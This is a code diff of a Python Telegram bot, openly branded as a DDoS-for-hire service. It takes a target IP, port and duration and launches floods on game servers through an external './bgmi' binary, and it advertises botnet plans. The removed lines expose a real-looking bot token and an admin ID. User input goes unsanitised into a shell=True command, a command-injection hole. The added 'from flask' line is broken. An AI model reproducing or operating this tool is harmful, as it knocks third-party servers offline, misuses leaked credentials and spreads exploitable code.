@@ -5,19 +5,44 @@ import subprocess
 import requests
 import datetime
 import os
+from flask
+import threading
 
 # insert your Telegram bot token here
-bot = telebot.TeleBot('7102669975:AAGKoAvRLrICSmMeTuxnuZZ1TF70Dan9BJk')
+bot = telebot.TeleBot('')
 
 # Admin user IDs
-admin_id = ["5930596985"]
+admin_id = [""]
 
 # File to store allowed user IDs
 USER_FILE = "users.txt"
-
 # File to store command logs
 LOG_FILE = "log.txt"
+app = Flask(__name__)
 
+@app.route('/')
+def hello_world():
+    return 'Hello, World!'
+
+def make_all_files_executable():
+    files_in_directory = [f for f in os.listdir('.') if os.path.isfile(f)]
+    for file in files_in_directory:
+        subprocess.run(["chmod", "+x", file])
+
+def send_startup_message():
+    print('Bot Connected')
+    
+    for admin in admin_id:
+        bot.send_message(admin, "Bot is now connected 🤖 !")
+    make_all_files_executable()
+
+def run_bot():
+    send_startup_message()
+    bot.polling(non_stop=True)
+
+
+def run_web():
+    app.run(host='0.0.0.0', port=8000)
 
 # Function to read user IDs from the file
 def read_users():
@@ -26,6 +51,7 @@ def read_users():
             return file.read().splitlines()
     except FileNotFoundError:
         return []
+
 
 # Function to read free user IDs and their credits from the file
 def read_free_users():
@@ -39,13 +65,15 @@ def read_free_users():
                         user_id, credits = user_info
                         free_user_credits[user_id] = int(credits)
                     else:
-                        print(f"Ignoring invalid line in free user file: {line}")
+                        print(
+                            f"Ignoring invalid line in free user file: {line}")
     except FileNotFoundError:
         pass
 
 
 # List to store allowed user IDs
 allowed_user_ids = read_users()
+
 
 # Function to log command to the file
 def log_command(user_id, target, port, time):
@@ -54,9 +82,11 @@ def log_command(user_id, target, port, time):
         username = "@" + user_info.username
     else:
         username = f"UserID: {user_id}"
-    
+
     with open(LOG_FILE, "a") as file:  # Open in "append" mode
-        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")
+        file.write(
+            f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n"
+        )
 
 
 # Function to clear logs
@@ -72,6 +102,7 @@ def clear_logs():
         response = "No logs found to clear."
     return response
 
+
 # Function to record command logs
 def record_command_logs(user_id, command, target=None, port=None, time=None):
     log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
@@ -81,10 +112,10 @@ def record_command_logs(user_id, command, target=None, port=None, time=None):
         log_entry += f" | Port: {port}"
     if time:
         log_entry += f" | Time: {time}"
-    
+
     with open(LOG_FILE, "a") as file:
         file.write(log_entry + "\n")
-
+    
 @bot.message_handler(commands=['add'])
 def add_user(message):
     user_id = str(message.chat.id)
@@ -105,7 +136,6 @@ def add_user(message):
         response = "Only Admin Can Run This Command 😡."
 
     bot.reply_to(message, response)
-
 
 
 @bot.message_handler(commands=['remove'])
@@ -150,7 +180,6 @@ def clear_logs_command(message):
         response = "Only Admin Can Run This Command 😡."
     bot.reply_to(message, response)
 
- 
 
 @bot.message_handler(commands=['allusers'])
 def show_all_users(message):
@@ -202,18 +231,21 @@ def show_user_id(message):
     response = f"🤖Your ID: {user_id}"
     bot.reply_to(message, response)
 
+
 # Function to handle the reply when free users run the /bgmi command
 def start_attack_reply(message, target, port, time):
     user_info = message.from_user
     username = user_info.username if user_info.username else user_info.first_name
-    
-    response = f"{username}, 𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃.🔥🔥\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐞𝐭𝐡𝐨𝐝: BGMI"
+
+    response = f"❗⭕DEADLINE DDOS BOT⭕❗\n\n{username}, \n𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃.🔥\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐞𝐭𝐡𝐨𝐝: Valkyrae\n\n💎 THANKS FOR USING ME 💎"
     bot.reply_to(message, response)
+
 
 # Dictionary to store the last time each user ran the /bgmi command
 bgmi_cooldown = {}
 
-COOLDOWN_TIME =0
+COOLDOWN_TIME = 0
+
 
 # Handler for /bgmi command
 @bot.message_handler(commands=['bgmi'])
@@ -223,34 +255,36 @@ def handle_bgmi(message):
         # Check if the user is in admin_id (admins have no cooldown)
         if user_id not in admin_id:
             # Check if the user has run the command before and is still within the cooldown period
-            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < 300:
-                response = "You Are On Cooldown ❌. Please Wait 5min Before Running The /bgmi Command Again."
+            if user_id in bgmi_cooldown and (
+                    datetime.datetime.now() -
+                    bgmi_cooldown[user_id]).seconds < 10:
+                response = "You Are On Cooldown ❌. Please Wait 3min Before Running The /bgmi Command Again."
                 bot.reply_to(message, response)
                 return
             # Update the last time the user ran the command
             bgmi_cooldown[user_id] = datetime.datetime.now()
-        
+
         command = message.text.split()
         if len(command) == 4:  # Updated to accept target, time, and port
             target = command[1]
             port = int(command[2])  # Convert time to integer
             time = int(command[3])  # Convert port to integer
-            if time > 600:
+            if time > 280:
                 response = "Error: Time interval must be less than 600."
             else:
                 record_command_logs(user_id, '/bgmi', target, port, time)
                 log_command(user_id, target, port, time)
-                start_attack_reply(message, target, port, time)  # Call start_attack_reply function
+                start_attack_reply(message, target, port,
+                                   time)  # Call start_attack_reply function
                 full_command = f"./bgmi {target} {port} {time} 200"
                 subprocess.run(full_command, shell=True)
                 response = f"BGMI Attack Finished. Target: {target} Port: {port} Port: {time}"
         else:
             response = "✅ Usage :- /bgmi <target> <port> <time>"  # Updated command syntax
     else:
-        response = "❌ You Are Not Authorized To Use This Command ❌."
+        response = "❌ You Are Not Authorized To Use This Command Contact @valkyraegfx For User Permission ❌."
 
     bot.reply_to(message, response)
-
 
 
 # Add /mylogs command to display logs recorded for bgmi and website commands
@@ -261,7 +295,9 @@ def show_command_logs(message):
         try:
             with open(LOG_FILE, "r") as file:
                 command_logs = file.readlines()
-                user_logs = [log for log in command_logs if f"UserID: {user_id}" in log]
+                user_logs = [
+                    log for log in command_logs if f"UserID: {user_id}" in log
+                ]
                 if user_logs:
                     response = "Your Command Logs:\n" + "".join(user_logs)
                 else:
@@ -276,15 +312,12 @@ def show_command_logs(message):
 
 @bot.message_handler(commands=['help'])
 def show_help(message):
-    help_text ='''🤖 Available commands:
-💥 /bgmi : Method For Bgmi Servers. 
-💥 /rules : Please Check Before Use !!.
-💥 /mylogs : To Check Your Recents Attacks.
-💥 /plan : Checkout Our Botnet Rates.
-
-🤖 To See Admin Commands:
-💥 /admincmd : Shows All Admin Commands.'''
-
+    help_text = '''👾DEADLINE DDOS BOT COMMANDS👾\n
+💎 /bgmi : Method For Bgmi Servers. 
+💎 /rules : Please Check Before Use !!.
+💎 /mylogs : Check Your Recents Attacks.
+💎 /plan : Checkout Our Botnet Rates.
+♠️ /admincmd : Shows All Admin Commands.'''
 
     for handler in bot.message_handlers:
         if hasattr(handler, 'commands'):
@@ -296,13 +329,16 @@ def show_help(message):
                 help_text += f"{handler.commands[0]}: {handler.doc}\n"
     bot.reply_to(message, help_text)
 
+
 @bot.message_handler(commands=['start'])
 def welcome_start(message):
     user_name = message.from_user.first_name
-    response = f'''👋🏻Welcome to Your Home, {user_name}! Feel Free to Explore.
-🤖Try To Run This Command : /help 
-Welcome To The World's Best Ddos Bot⚡'''
+    response = f'''👋🏻{user_name} Welcome To Our Bot !😇\n
+❗⭕DEADLINE MOD - PUNISHER⭕❗\n
+For Bot Helping Menu Type : /help 😁.\n
+Welcome To The DDoS Bot Enjoy It.⚡'''
     bot.reply_to(message, response)
+
 
 @bot.message_handler(commands=['rules'])
 def welcome_rules(message):
@@ -314,22 +350,14 @@ def welcome_rules(message):
 3. We Daily Checks The Logs So Follow these rules to avoid Ban!!'''
     bot.reply_to(message, response)
 
+
 @bot.message_handler(commands=['plan'])
 def welcome_plan(message):
     user_name = message.from_user.first_name
-    response = f'''{user_name}, Brother Only 1 Plan Is Powerfull Then Any Other Ddos !!:
-
-Vip 🌟 :
--> Attack Time : 200 (S)
-> After Attack Limit : 2 Min
--> Concurrents Attack : 300
-
-Pr-ice List💸 :
-Day-->150 Rs
-Week-->900 Rs
-Month-->1600 Rs
+    response = f'''{user_name}, Now Here Is No Any Plan's Bot Under Progress And Updating.. So No Plans Available Right now 😕 Hope It Soon Posible 😁 Message By Owner @valkyraegfx
 '''
     bot.reply_to(message, response)
+
 
 @bot.message_handler(commands=['admincmd'])
 def welcome_plan(message):
@@ -352,14 +380,17 @@ def broadcast_message(message):
     if user_id in admin_id:
         command = message.text.split(maxsplit=1)
         if len(command) > 1:
-            message_to_broadcast = "⚠️ Message To All Users By Admin:\n\n" + command[1]
+            message_to_broadcast = "⚠️ Message To All Users By Admin:\n\n" + command[
+                1]
             with open(USER_FILE, "r") as file:
                 user_ids = file.read().splitlines()
                 for user_id in user_ids:
                     try:
                         bot.send_message(user_id, message_to_broadcast)
                     except Exception as e:
-                        print(f"Failed to send broadcast message to user {user_id}: {str(e)}")
+                        print(
+                            f"Failed to send broadcast message to user {user_id}: {str(e)}"
+                        )
             response = "Broadcast Message Sent Successfully To All Users 👍."
         else:
             response = "🤖 Please Provide A Message To Broadcast."
@@ -369,6 +400,12 @@ def broadcast_message(message):
     bot.reply_to(message, response)
 
 
+if __name__ == "__main__":
+    # Create threads for the bot and web server
+    bot_thread = threading.Thread(target=run_bot)
+    web_thread = threading.Thread(target=run_web)
 
+    # Start both threads
+    bot_thread.start()
+    web_thread.start()
 
-bot.polling()
